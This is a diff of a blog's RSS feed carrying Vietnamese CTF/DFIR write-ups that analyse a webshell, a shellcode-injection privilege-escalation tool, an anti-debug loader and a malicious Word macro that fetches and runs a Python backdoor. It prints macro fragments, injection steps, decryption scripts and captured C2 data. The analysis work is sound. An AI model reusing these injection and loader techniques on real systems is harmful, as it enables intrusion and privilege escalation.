 &lt;p&gt;Check file pcap với các trường data= được gửi trong file shell.apsx
-&lt;img src=&quot;https://hackmd.io/_uploads/rJrB5cCLlg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SkUNq9ALex.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/rJrB5cCLlg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/SkUNq9ALex.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Đây là script tôi xử lý
-&lt;img src=&quot;https://hackmd.io/_uploads/H1ilcqAUxg.jpg&quot; alt=&quot;decrypt&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/H1ilcqAUxg.jpg&quot; alt=&quot;decrypt&quot; /&gt;&lt;/p&gt;
 &lt;h2&gt;Phân tích Traffic PlainText&lt;/h2&gt;
 &lt;p&gt;Format output trong file Decrypt.bin
-&lt;img src=&quot;https://hackmd.io/_uploads/HJnqq9ALll.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/HJnqq9ALll.png&quot; alt=&quot;image&quot; /&gt;
 Đúng như idea ban đâu mỗi lần Request payload sẽ có một class SharPyShell và func ExecRunTime để Invoke và thực thi trên server theo như logic file NET&lt;/p&gt;
 &lt;h3&gt;Tiếp theo nó sẽ Drop một tool powershell script dùng để leo quyền (Privilege Escalation)&lt;/h3&gt;
 &lt;p&gt;Spawn một cái powershell
-&lt;img src=&quot;https://hackmd.io/_uploads/SJxKCHALee.jpg&quot; alt=&quot;payloadshell&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/ByQU8IpLge.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/SJxKCHALee.jpg&quot; alt=&quot;payloadshell&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/ByQU8IpLge.png&quot; alt=&quot;image&quot; /&gt;
 Decrypt payload với base sau đó Xor với key
 và chạy tools với các đối số
 Output
-&lt;img src=&quot;https://hackmd.io/_uploads/SJECLIaIlg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/SJECLIaIlg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;h3&gt;Xử lý Shellcode&lt;/h3&gt;
 &lt;p&gt;Trong Script được gửi bởi attacker thì có 2 function InjectionShellcodeAsUser và InjectionShellcode&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SkyA3BCIxl.jpg&quot; alt=&quot;payloadshell&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/SkyA3BCIxl.jpg&quot; alt=&quot;payloadshell&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;snapshort ThreadParametes được truyền vào
-&lt;img src=&quot;https://hackmd.io/_uploads/B1wgqGpIle.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/B1wgqGpIle.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;
 &lt;p&gt;Đăng nhập với user&lt;/p&gt;
@@ -1767,7 +1767,7 @@ Tạo RemoteThread chạy shellcode tại codeMemAddress, truyền threadParamet
 &lt;h3&gt;Phân tích shellcode DLL với IDAPro&lt;/h3&gt;
 &lt;p&gt;&lt;strong&gt;Tại điểm này call InjectShellcode với Entry 0x2880&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;Chương trình sẽ gọi tới EntryPoint&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BkVx6B08xl.png&quot; alt=&quot;image&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/BkVx6B08xl.png&quot; alt=&quot;image&quot; /&gt;
 Chương trình sẽ parser input và truyền vào hàm Juicy với phần payload shellcode&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;ThreadParameter:
     [filepath]\0
@@ -1782,7 +1782,7 @@ Chương trình sẽ parser input và truyền vào hàm Juicy với phần payl
 
 &lt;/code&gt;&lt;/pre&gt;
 &lt;h3&gt;Parser ThreadParameter&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BJYD9BRLel.png&quot; alt=&quot;code&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/BJYD9BRLel.png&quot; alt=&quot;code&quot; /&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;Output:
 [+] Parsed Data:
   filepath: C:\Windows\Temp\x1fvogijp5pyzn7\9nu8w1q
@@ -1797,7 +1797,7 @@ Chương trình sẽ parser input và truyền vào hàm Juicy với phần payl
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;trong Hàm Juicy có tạo một Thread với function StartAddress cho việc xử lý Connection Network
 và tại hàm Juicy tiếp quy trình Spawn Host Process và Injection Shellcode với &lt;strong&gt;CreateRemoteThread&lt;/strong&gt;
-&lt;img src=&quot;https://hackmd.io/_uploads/SJwmASRIll.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/SJwmASRIll.png&quot; alt=&quot;image&quot; /&gt;
 &lt;strong&gt;Thành phần	Mục đích&lt;/strong&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;a1 (CLSID)	Gọi COM trigger để lấy token SYSTEM&lt;/li&gt;
@@ -1814,38 +1814,38 @@ WriteProcessMemory + CreateRemoteThread	Inject và thực thi payload&lt;/li&gt;
 &lt;li&gt;CLSID thường là COM hijack hoặc UAC bypass trigger.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;Dump shellcode payload juicy ra va dung Floss
-&lt;img src=&quot;https://hackmd.io/_uploads/ryhHZURLgl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/ryhHZURLgl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;h3&gt;InjectShellcodeAs be called và xử lý với x64dbg&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Skd2W8CLlx.png&quot; alt=&quot;InjectShellcodeAS&quot; /&gt;
-&lt;img src=&quot;https://hackmd.io/_uploads/ry_lMU0Lgg.png&quot; alt=&quot;image&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/Skd2W8CLlx.png&quot; alt=&quot;InjectShellcodeAS&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/ry_lMU0Lgg.png&quot; alt=&quot;image&quot; /&gt;
 shellcode này có dung tệp C:\xor.k được  tạo từ shellcode juicy payload
 tôi sử dụng shcode2.py để convert shellcode.bin to EXE và debug nó trong x64dbg
-&lt;img src=&quot;https://hackmd.io/_uploads/B1axpKAUee.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/B1axpKAUee.png&quot; alt=&quot;image&quot; /&gt;
 ngay tại điểm đầu code nó đã call một function và ta thấy các giá trị &quot;C:\xor.k được hiển thị&quot;
-&lt;img src=&quot;https://hackmd.io/_uploads/S1Q2pFRUge.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/S1Q2pFRUge.png&quot; alt=&quot;image&quot; /&gt;
 Thử debug và chương trình đã bị crash ở vùn đọc file tôi nghĩ do không thể truy cập vùng nhớ lúc đọc file và tôi sẽ cấp quyền cho 2 vùng nhớ [rsp+10] và [rsp+20] sau đó debug tiếp
 Tại offset&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;mov qword ptr ss:[rsp+10h] ,rbx 
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;cấp quyền Write cho phân vùng này của kernel32 để sử dụng WriteFile/ReadFile ghi dữ liệu
-&lt;img src=&quot;https://hackmd.io/_uploads/B1GLmqR8lx.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/B1GLmqR8lx.png&quot; alt=&quot;image&quot; /&gt;
 ER-- to ERW--
 Tại offset&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;mov qword ptr ss:[rsp+20], r9
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;cấp quyền cho phân vùng r9
-&lt;img src=&quot;https://hackmd.io/_uploads/SyJy4qRLxg.png&quot; alt=&quot;image&quot; /&gt;
-&lt;img src=&quot;https://hackmd.io/_uploads/r1Sb450Uxe.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/SyJy4qRLxg.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/r1Sb450Uxe.png&quot; alt=&quot;image&quot; /&gt;
 của .text file shel2.exe cho phép đọc và ghi dữ liệu
 Do không có quyền truy cập vùng nhớ file và tôi phải patch nên dữ liệu đọc được sẽ là giá trị rác
-&lt;img src=&quot;https://hackmd.io/_uploads/BJ2erqRLgx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/BJ2erqRLgx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;đặt breakpoint ở offset = 00007FF6214B1145
 Fix lại giá trị rác của [rsp+161]&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;FF FE 78 00 47 00 6B 00 -&amp;gt; xGk89_Ew
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;vì thế đến đoạn xử lý [rsp+161] được coi là buffer of File tôi sẽ điền value file ở đó
 và tiếp tục xor để lấy flag
-&lt;img src=&quot;https://hackmd.io/_uploads/SkTrrqA8xg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/SkTrrqA8xg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;PS: Bài này mình thấy khá là nặng về Obfuscation và Reverse Engineering nếu như intend solution không cần phải guessy&lt;/p&gt;
 </content:encoded></item><item><title>TheSaintManBat</title><link>https://bruning-frighting.github.io/KAiZ3nThong/posts/thesaintmanbat/</link><guid isPermaLink="true">https://bruning-frighting.github.io/KAiZ3nThong/posts/thesaintmanbat/</guid><pubDate>Fri, 20 Jun 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;The Saint Bat&lt;/h1&gt;
 &lt;blockquote&gt;
@@ -1857,17 +1857,17 @@ Note: This challenge doesn&apos;t have any questions but the flag itself!
 File Password : vOCorthoAGESeNsivEli&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;Kiểm tra process list và file scan ta tiến hành dump file confidential.exe có dấu hiệu ra
-&lt;img src=&quot;https://hackmd.io/_uploads/SkxpqhXNxl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/SkxpqhXNxl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;└[ mnt »  »  » Memchall ]
 ❯ file confidential.exe
 confidential.exe: PE32+ executable for MS Windows 6.00 (console), x86-64, 6 sections
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;check signature file đây là một file PE32+
-&lt;img src=&quot;https://hackmd.io/_uploads/S1YSohQNlx.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/S1YSohQNlx.png&quot; alt=&quot;image&quot; /&gt;
 check file với IDA tiến hành static analysis&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/H18AjnmVle.png&quot; alt=&quot;image&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/H18AjnmVle.png&quot; alt=&quot;image&quot; /&gt;
 Ta thấy hàm sub_140002D50 có vẻ rất ấn tượng&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rkbM62QExl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/rkbM62QExl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Trong hàm chứ 1 anti debug and một AddVectoredExceptionHandler theo logic code thì attacker sẽ gây ra exception để đưa chương trình tới trình Handler xử lý main logic&lt;/p&gt;
 &lt;p&gt;Handler -&amp;gt; (DWORD64)sub_1400020F0 đây là hàm chứa logic chính&lt;/p&gt;
 &lt;h2&gt;Tại sub_1400020F0&lt;/h2&gt;
@@ -1876,9 +1876,9 @@ nhưng key có vẻ đã bị obfuscation để làm cho khó phân tích tĩnh 
 Sau khi decrypted(unpacked) nó được load vào explorer.exe if 32bit thì folder path : C:\Windows\SysWOW64\explorer.exe, còn nếu 64bit thì C:\Windows\explorer.exe sau
 nó sẽ chạy file bằng CreateProcessA&lt;/p&gt;
 &lt;p&gt;Mục tiêu debug là bypass anti debug và pass Exception đặt break tại handler và sub_1400020F0
-&lt;img src=&quot;https://hackmd.io/_uploads/rJe-4amVee.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/rJe-4amVee.png&quot; alt=&quot;image&quot; /&gt;
 Tại đây tôi sẽ skip để bypass anti debug
-&lt;img src=&quot;https://hackmd.io/_uploads/B1Q44TXNlg.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/B1Q44TXNlg.png&quot; alt=&quot;image&quot; /&gt;
 Tại đây gây ra exception với lệnh call Sleep Tại sao lại xảy ra Exception?&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;Using VirtualProtect with PAGE_GUARD and Sleep can trigger an access violation exception when the protected memory is accessed, even if the access is not directly from the code that called VirtualProtect. This occurs because the OS handles the exception generated by the guard page, and the Sleep call can indirectly cause this access. 
 Here&apos;s a breakdown:
@@ -1890,12 +1890,12 @@ The Sleep function itself doesn&apos;t directly cause the exception. However, wh
 The exception is handled by the operating system, and if a handler is registered (e.g., using AddVectoredExceptionHandler), the handler function can then execute. 
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;và được xử lý để nhảy vào hàm sub_1400020F0
-&lt;img src=&quot;https://hackmd.io/_uploads/ryOoVT7Nle.png&quot; alt=&quot;image&quot; /&gt;
-&lt;img src=&quot;https://hackmd.io/_uploads/Sk_nBpQExg.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/ryOoVT7Nle.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/Sk_nBpQExg.png&quot; alt=&quot;image&quot; /&gt;
 Tại đây v15 lưu một đỉa chỉ stack chứa key&lt;/p&gt;
 &lt;h3&gt;key : }zr#llKn]gh~_hides_the_key?idk&lt;/h3&gt;
 &lt;h2&gt;Decrypt STUB&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJLzUamExl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/SJLzUamExl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Sau khi lấy key và decrypt thi ta tiến hành reverse file STUB&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
 {
@@ -1973,14 +1973,14 @@ Tại đây v15 lưu một đỉa chỉ stack chứa key&lt;/p&gt;
 &lt;li&gt;Để decrypt ta phải có được g_SHAhash và g_RandomSalt và Cookie, CreateTime&lt;/li&gt;
 &lt;li&gt;Trong đó g_SHAhash,Cookie,CreateTime sẽ dùng tạo key và g_RanDomSalt là IV&lt;/li&gt;
 &lt;li&gt;vì sao nó sử dụng AES mà không phải 3DES
-&lt;img src=&quot;https://hackmd.io/_uploads/ByW3eTX4ex.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/ByW3eTX4ex.png&quot; alt=&quot;image&quot; /&gt;
 Tại đây mỗi block là 16 cho AES128 và 3DES mỗi block là 8
 https://blog.slowerzs.net/posts/cryptdecryptmemory/
 đây là blog bạn có thể tham khảo về decrypt CryptProctectMemory&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h2&gt;Kernel Debug WinDBG&lt;/h2&gt;
 &lt;p&gt;để thuận tiện tôi sẽ sử dụng WinDBG để debug kernels và load các symbols
-&lt;img src=&quot;https://hackmd.io/_uploads/rkzkz6QNll.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/rkzkz6QNll.png&quot; alt=&quot;image&quot; /&gt;
 đây là các thông tin ta cần&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;from Crypto.Cipher import AES
 from Crypto.Hash import SHA1
@@ -2016,7 +2016,7 @@ key : faa8db02422c737fce649f4f09169ec3
 iv: 7554c7579418f054170f4c3ccd56b0e3
 
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/r1O0G6QVgx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/r1O0G6QVgx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;PS: Nếu các bạn có thắc mắc gì có thể inbox cho mình&lt;/p&gt;
 </content:encoded></item><item><title>The Malware Crusade (DFIR Labs Series)</title><link>https://bruning-frighting.github.io/KAiZ3nThong/posts/malwarecursada/</link><guid isPermaLink="true">https://bruning-frighting.github.io/KAiZ3nThong/posts/malwarecursada/</guid><pubDate>Fri, 20 Jun 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;The Malware Crusade&lt;/h1&gt;
 &lt;blockquote&gt;
@@ -2044,8 +2044,8 @@ Q7) What is inside the private secret storage ?
 &lt;/code&gt;&lt;/pre&gt;
 &lt;h2&gt;Question1&lt;/h2&gt;
 &lt;p&gt;Tôi sử dụng công cụ oletools để extraction ra các macro chứa trong file cv_001.dotm
-&lt;img src=&quot;https://hackmd.io/_uploads/SJ5HjPMNex.png&quot; alt=&quot;image&quot; /&gt;
-&lt;img src=&quot;https://hackmd.io/_uploads/r1sLowMExx.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/SJ5HjPMNex.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/r1sLowMExx.png&quot; alt=&quot;image&quot; /&gt;
 Trong macro có các Function&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Sub AutoOpen() chức năng tự động chạy DownloadAndOpenFile và RegistryEntry&lt;/li&gt;
@@ -2060,7 +2060,7 @@ python.exe &amp;amp; &quot; &quot; &amp;amp; &apos; &amp;amp; DestinationPath &a
 &lt;/ul&gt;
 &lt;h3&gt;Answer 1 : keyValue = &quot;fA3bDt&quot;&lt;/h3&gt;
 &lt;p&gt;Kiểm tra và lấy file trong folder path : C:\Users\challenge\AppData\Local\Temp\msserver.py
-&lt;img src=&quot;https://hackmd.io/_uploads/SkUU2PGNgx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/SkUU2PGNgx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;import json
 import os
 import shutil
@@ -2297,8 +2297,8 @@ Nếu không có flag thì decode base64 và decrypt XOR&lt;/li&gt;
 &lt;li&gt;shell(): Control handler&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;Từ script ta lọc wireshark với ip.addr == 192.168.56.1 &amp;amp;&amp;amp; tcp.port == 5555&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/B1wh1_fExx.png&quot; alt=&quot;image&quot; /&gt;
-&lt;img src=&quot;https://hackmd.io/_uploads/BJvpJuMNxe.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/B1wh1_fExx.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/BJvpJuMNxe.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;script decrypt.py&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;import base64
 enc = [&quot;d2ltYmls&quot;, &quot;Y2ljb2hZZW9pZWZuYmprAho=&quot;, &quot;ZWJqbCRpT2RYQE1MVG54&quot;, &quot;bEhhU01CQV9rfwcB&quot;, &quot;ZWJqbCRkUTZ/azlBPERGRXhzf0Fid0Vgf3spVm9UVlEReExhXUcUaURKGWZfZGZhAFJfX0FvT0BfXQhXSV5TaS4CJX55ZXh5aC8jJyljOjck&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRfQVFlQEJBYFRZXXZyf0V6dE5ZKHp0d3p5c1lTRXV2S0QUcR1laWlWSXllQmtqWEd8fm1QW3JtUGUMCigjFRY0CiEodWl0dWwrJyM1fyYrIA==&quot;,  &quot;ZWJqbCRMRUZvQEJZdWhaYFsxLC00c397fTduY2g=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTWlLRXdkdiVFYXxMIm5HRnRHcXFhF0RxElFzfUhZeR1tXFNZR1hQZV9KY2JQT3R2cXEYLzcoIBUsA2l0dWwrJyM1fyYrIA==&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTSJIRWslT0Vgf0FjWiVUVntQQ0xpSH9fEnpNfX1VSHh1WFN6ZVhnblBXWldtUlxmcXAiLC8iJHQRfQUJCX4UGTdhCwRqIQwBZjQSCzRhfWBhQAcLDwFLEh8c&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTSNwRSZtT0F0bUgoY2p+LElse3pIS0ZLcUZIcmUcTkBDVlAAZQF+Z1gFGQQFHFtXUyVvNjsw&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTWlLSkEldnsjf313XW95SUprARwdBENPS00HXlNY&quot;,  &quot;ZWJqbCRMRUZvQE1dOFQ8WWd1VnxfNSgpOH9zd3kzamdU&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTWdISl1uVnEqJTkkJTx7d3NFD1ZbUA==&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRkNFE9QE47a2k8Y2Vyf0V6WX1/VEtMd3pML0lzdEl1a3NgHn58Gn1/bkkSDREMDRRTX1tdF05DSA==&quot;,  &quot;ZWJqbCRmNVFhaDhdOURKP3dye1lAdyRNKH0oXWVHSGd2Q09PUUYVdUBLbVxFbkkSDREMDRRTX1tdF05DSA==&quot;,  &quot;ZWJqbCRha0F7bV1dam9jSWRLQVItXFVdWnpSWW98SVFIRWVPUkdPbmMJFBUMS0dDVR9GS0A=&quot;,  &quot;ZWJqbCRha0F7bV1ea11dTWlLRVV/TSVddEMod2Z5VlUVeRF5TEducURibV9ASH1YV1IBZV1UBGENdXl5DmRpR3EbFHoxHBF2JAIbJHFtcHFwNzs/MXsiLyw=&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRkNFE9QE47a2ljSWN1RUZfNSgpOH9zd3kzamdU&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRfaz5+QE47a0ZPYC0xLC00c397fTduY2g=&quot;,  &quot;ZWJqbCRMRUZvQEx/fERJVWZye1FkXFF7bVBSVSx+c3NVe1sWTEYUaVhIfBJfTx1LXFJffVxWBGFcel0GAR0AAWAnKy8hazI/PA==&quot;,  &quot;ZWJqbCRMRUZvQEl4a1o8ZHdLfyptXFF8f3hNL3t+LU1ZQHUWSmlLYVJwGEdcdR15R1J1ZU1sBHFCY2wLdx0AAWAnKy8hazI/PA==&quot;,  &quot;ZWJqbCRMRUZvQEl4a1o8ZHdLfyptXFF8f3hNL3t+LU1ZQHUWSmlLdVhzGEccTh8fexEMDRRTX1tdF05DSA==&quot;,  &quot;ZWJqbCROV2g1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRfaz5xQE1ga2xZO3dyf1VhTyRCd1dZcCpeeSIdARwdBENPS00HXlNY&quot;,  &quot;ZWJqbCRMRUZvQE1/YGhdTmJBQVFtTEEic3soK2lELHdWQHVtSG5hfV5LU0BnDRAREFdbX1EbQk9M&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRfQVFlQE1/YGhYQXpwVUJ7dCRBLVJOdFc9ICEAR0tPQQtSX1w=&quot;,  &quot;ZWJqbCRMRUZvQEJFZmxJWXtYViNzQiR8f0N3ImVUWXRHQHUXQ0ZLYV1zGH5DYG1YV3xYZgZ+YAdzGQQFHFtXUyVvNjsw&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRMRUZvQE1ga11dTmdSdS4pNSgpOH9zd3kzamdU&quot;,  &quot;ZWJqbCRMRUZvQE1Rem5nTWFYVX9hXF5dcHt3f3BWWl5TaGZqFWtPTB5qTRYRDRAREFdbX1EbQk9M&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTWBYViNzXlF8f1JjWWZELHdMe2RXVX11ZlpgbV9ASHhbQXhxZlNXcWFNcn1PUFhtUyQKEQIoDAIOeQctJHFtcHFwNzs/MXsiLyw=&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTSBzSlJzRUVVYkAoc3BHWGtReXNMGQUYGQhPQ0dJA1pXRA==&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTWpIIHt4T1BjaUFJWiVUVlFKQGV1T3IUS0xqTRYRDRAREFdbX1EbQk9M&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTWpIIHt4T1BjaEFJWiVUVk1UQmNMGQUYGQhPQ0dJA1pXRA==&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRMRUZvQEJBYGlGWWlze1FuTCR/dENbdCE9ICEAR0tPQQtSX1w=&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRfQVFlQE1vYG9iQSByf0V8d0V/YkAoc3BHXXQWYkUeGQUYGQhPQ0dJA1pXRA==&quot;,  &quot;ZWJqbCRMRUZvQE1ga11dTmdSdS4pNSgpOH9zd3kzamdU&quot;,  &quot;ZWJqbCRMRUZvQE1ka11dTmdSdS4pNSgpOH9zd3kzamdU&quot;,  &quot;ZWJqbCRMRUZvQEJvY2xZd3xYVEFtcUFCLlp9JiE9ICEAR0tPQQtSX1w=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTWBYViNzXlJSf1JjWWxWTV5MaGZqFWtBSBUJFBUMS0dDVR9GS0A=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTWFYViNzXl5ZcnhdTXdKLHNEaGFQQ0RPTE9jeWpVY3p2exEMDRRTX1tdF05DSA==&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTSBzSlJzRUVVYkAoc3BHWGtReXNMGQUYGQhPQ0dJA1pXRA==&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTWpIIHt4T1BjaUFJWiVUVlFKQGV1T3IUS0xqTRYRDRAREFdbX1EbQk9M&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTWpIIHt4T1BjaEFJWiVUVk1UQmNMGQUYGQhPQ0dJA1pXRA==&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTSVwRUVnT1VVYkAoc3BHWGxPQhBtS39xdUpIfBtLZldtSmgAW1hvcENJYWlQW3dtfjkPFhkgBiF6dWl0dWwrJyM1fyYrIA==&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRfQVFlQE1deVQ9RSVyWkJ7cVFBLH1ZbHt8LEkVanZMbwUYGQhPQ0dJA1pXRA==&quot;,  &quot;ZWJqbCRMRUZvQE1nYURJY2pwRSZucVFRbUAoTnN5WUkURWFUQ0YVdVFifkRnDRAREFdbX1EbQk9M&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTSBLSnskXFInf31dTSh5XSpMQ09tUn9hckdgRH0cd0cfBHhbWH8VCAkYX1NXWRNKRzQ=&quot;,  &quot;ZWJqbCRMRUZvQE1nYURJY2pwRSZucVFRbUAoTnN8LEkVbWFhXkFublhmTUQRDRAREFdbX1EbQk9M&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTWJLSnhzRUVVakNCcGlHSSpKQxBxSG5lbRlNbXJYYm1mQHJVDgkVCAkYX1NXWRNKRzQ=&quot;,  